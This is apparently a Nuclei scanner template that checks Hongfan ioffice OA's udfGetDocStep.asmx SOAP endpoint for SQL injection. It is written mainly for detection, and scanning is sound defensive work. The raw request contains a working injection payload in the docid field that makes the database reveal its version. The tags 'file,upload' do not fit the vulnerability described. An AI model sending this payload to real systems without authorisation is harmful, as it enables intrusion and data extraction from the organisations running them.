hongfanOA-ioffice-udfGetDocStep.asmx-sql.yaml

id: hongfanOA-ioffice-udfGetDocStep-asmx-sql
info:
  name: 红帆ioffice-udfGetDocStep.asmx存在SQL注入漏洞
  author: cnaq
  severity: critical
  description: 红帆ioffice-udfGetDocStep.asmx存在SQL注入漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%BA%A2%E5%B8%86ioffice-udfGetDocStep.asmx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: hongfanOA,file,upload
requests:
  - raw:
      - |
        POST /ioffice/prg/interface/udfGetDocStep.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetDocStep"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
            <soap:Body>
            <GetDocStep xmlns="http://tempuri.org/">
                <docid>1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT @@version)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'</docid>
            </GetDocStep>
            </soap:Body>
        </soap:Envelope> 


    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - 'SQL'